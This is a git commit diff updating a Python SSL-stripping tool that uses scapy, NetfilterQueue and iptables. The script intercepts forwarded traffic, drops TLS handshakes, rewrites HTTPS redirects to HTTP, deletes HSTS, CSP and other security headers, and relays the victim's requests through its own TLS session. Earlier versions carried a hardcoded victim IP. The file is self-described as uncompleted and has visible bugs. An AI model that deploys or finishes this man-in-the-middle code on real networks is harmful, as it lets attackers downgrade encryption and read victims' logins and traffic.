7222c308bd6be974acec78b03d755b1125c53a7f
Djagur <64599344+Djagur@users.noreply.github.com>
2024-06-14 22:22:58 +0200

    Update ssl_stripping_tls_uncompleted.py to most uptodate version

--- ssl_stripping_tls_uncompleted.py
+++ ssl_stripping_tls_uncompleted.py
@@ -1,54 +1,60 @@
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
-from scapy.layers import http
 from scapy.layers.http import *
+from scapy.layers.tls import *
 import scapy
-from scapy import *
-from scapy.all import *
-#from scapy.layers.ssl_tls import *
+
 import os
 import threading
-import cryptography    #required for tls version needs to be >= 1.7 and < 42.0.0
+import cryptography    #required for tls
 
-load_layer("tls")    #enables tls for the https connection with the server
-load_layer("http")    #also useful, possibly redundant
+load_layer("tls")
+load_layer("http")
 
 class SslRemover():
 
-    def __init__(self, ip_victim, queue_num):
+    def __init__(self, queue_num):
 
         self.queue         = NetfilterQueue()
-        self.iprule_add    = "iptables -A FORWARD -j NFQUEUE --queue-num {}".format(queue_num)
-        self.iprule2_add    = "iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80"
-        self.iprule_remove = "iptables -D FORWARD -j NFQUEUE --queue-num {}".format(queue_num)
-        self.iprule2_remove = "iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80"
+        self.iprule_add    = "iptables -A FORWARD -p tcp -j NFQUEUE --queue-num {}".format(queue_num)
+        self.iprule_remove = "iptables -D FORWARD -p tcp -j NFQUEUE --queue-num {}".format(queue_num)
+
         self.thread        = threading.Thread(name="ssl-remover-{}".format(queue_num), target=self.queue.run)
         self.thread.setDaemon(True)
         self.connected_tls = False
+        self.current_url   = None
 
         self.queue.bind(queue_num, self.handle_packet)
 
     def start_tls_automaton(self, url):
-        self.connection = TLSClientAutomaton.tlsink(HTTP, server=url, dport=500)
-        #pkt = a.sr1(HTTP()/HTTPRequest(), session=TCPSession(app=True), timeout=2)
+        print "start tls automaton"
+        self.connection = TLSClientAutomaton.tlslink(HTTP, server=url, dport=443,ciphersuite=49199)
         self.connected_tls = True
+        
+        print "Connection TLS started with", url
 
     def close_tls_automaton(self):
+        print "stop tls automaton"
         self.connection.close_session()
         self.connected_tls = False
-
-    def send_and_receive_https(self, pkt):
-        self.connection.send(pkt)
-        self.handle_packet(self.connection.recv())  
+        print "Connection TLS ended with", url
     
-
     def handle_packet(self, packet_nfqueue):
-        packet_scapy = IP(packet_nfqueue.get_payload())
+        """Handles each packet in the queue by parsing them and editing them."""
+        packet_scapy = IP(packet_nfqueue.get_payload()) #converts the raw packet to a scapy compatible string
 
-        if packet_scapy.haslayer(HTTPResponse):
-            print packet_scapy.show()
-            packet_scapy[HTTPResponse].Location = (packet_scapy[HTTPResponse].Location).replace("https://", "http://")
-            print packet_scapy[HTTPResponse].Location
+        if packet_scapy.haslayer(TLSClientHello):
+            return packet_nfqueue.drop()
+
+        if packet_scapy.haslayer(TLSServerHello):
+            self.connection.recv(packet_scapy)
+
+        if packet_scapy.haslayer(HTTPResponse): #read the scapy string to check for HTTP responses from the server
+            
+            if not packet_scapy[HTTPResponse].Location==None:
+                packet_scapy[HTTPResponse].Location = (packet_scapy[HTTPResponse].Location).replace("https://", "http://") #edit the redirect location to a http address instead of https
+
+            #delete cookies that might interfere
             del packet_scapy[HTTPResponse].Strict_Transport_Security
             del packet_scapy[HTTPResponse].Public_Key_Pins
             del packet_scapy[HTTPResponse].Content_Security_Policy
@@ -56,18 +62,23 @@ class SslRemover():
             del packet_scapy[HTTPResponse].X_Frame_Options
 
             packet_nfqueue.set_payload(bytes(packet_scapy))
-            return packet_nfqueue.accept()
 
+        elif packet_scapy.haslayer(HTTPRequest):
+            
+            if not packet_scapy[HTTPRequest].Path == "/":
+                return packet_nfqueue.accept()
 
-        if packet_scapy.haslayer(HTTPRequest):
             http_layer = packet_scapy[HTTPRequest]
             ip_layer = packet_scapy[IP]
+            url = http_layer.Host.decode()
 
-            print "HTTP Request to {}{}".format(http_layer.Host.decode(), http_layer.Path.decode())
-            
-
+            packet_scapy[HTTPRequest].Upgrade_Insecure_Requests = None
+            packet_nfqueue.set_payload(bytes(packet_scapy))
+    
+            # Create a new HTTP packet to forward the request
             new_packet = IP(src=ip_layer.src, dst=ip_layer.dst) / \
                          TCP(sport=packet_scapy[TCP].sport, dport=packet_scapy[TCP].dport, flags="PA") / \
+                         HTTP() / \
                          HTTPRequest(
                              Method=http_layer.Method,
                              Host=http_layer.Host,
@@ -78,49 +89,37 @@ class SslRemover():
                              Accept_Encoding=http_layer.Accept_Encoding,
                              Connection=b'close'
                          )
-            #send(new_packet)
-            print "Request packet made"
+            if url != self.current_url and url not in ["detectportal.firefox.com", "r3.o.lencr.org"]:
+                try:
+                    self.close_tls_automaton()
+                except Exception as e:
+                    print e
+                print "Changed current url to", url
 
-             # Create a fake HTTP response
-            response_packet = IP(src=ip_layer.dst, dst=ip_layer.src) / \
-                              TCP(sport=packet_scapy[TCP].dport, dport=packet_scapy[TCP].sport, flags="PA") / \
-                              HTTPResponse(
-                                  Content_Type=b"text/html",
-                                  Content_Length=str(len([0,1,2])),
-                                  Server=b"FakeServer"
-                              )
-    
-            # Send the fake response
-            #send(response_packet)
-            print "Response packet made"
-
-            if not self.connected_tls:
-                start_tls_automaton(ip_layer.dst)
+                self.start_tls_automaton(ip_layer.dst)
+                self.current_url = url
+            elif url in ["detectportal.firefox.com", "r3.o.lencr.org"]:
+                return packet_nfqueue.accept()
                 
-            send_and_receive_https(packet_nfqueue)
-            return True    #placeholder to exit function
-            
-        return packet_nfqueue.accept()
+            self.connection.send(new_packet)
+            return packet_nfqueue.drop()
 
+        return packet_nfqueue.accept() #accept the packet and release it back into the wild
+        
+      
     def start(self):
 
-        os.system(self.iprule_add)    #make sure SSL ssling
-        os.system(self.iprule2_add)    #make sure SSL ssling
+        os.system(self.iprule_add)
+        os.system("iptables -t nat -A POSTROUTING -o enp0s10 -j MASQUERADE")
+        os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP")
+        
         self.thread.start()    #queue starts accepting packages
+        print "Start SSL Stripping"
 
-        print "SSL stripping started"
 
     def stop(self):
 
-        os.system(self.iprule_remove)    #make sure SSL nbot ssling
-        os.system(self.iprule2_remove)    #make sure SSL nbot ssling
+        os.system(self.iprule_remove)
+
         self.queue.unbind()    #delete queue
-
-        print "SSL stripping stopped"
-
-if __name__ == "__main__":
-    ip_victim = "10.0.123.5"
-    ssl_remover = SslRemover(ip_victim, 2)
-    ssl_remover.start()
-    time.sleep(20)
-    ssl_remover.stop()
+        print "Stop SSL Stripping"
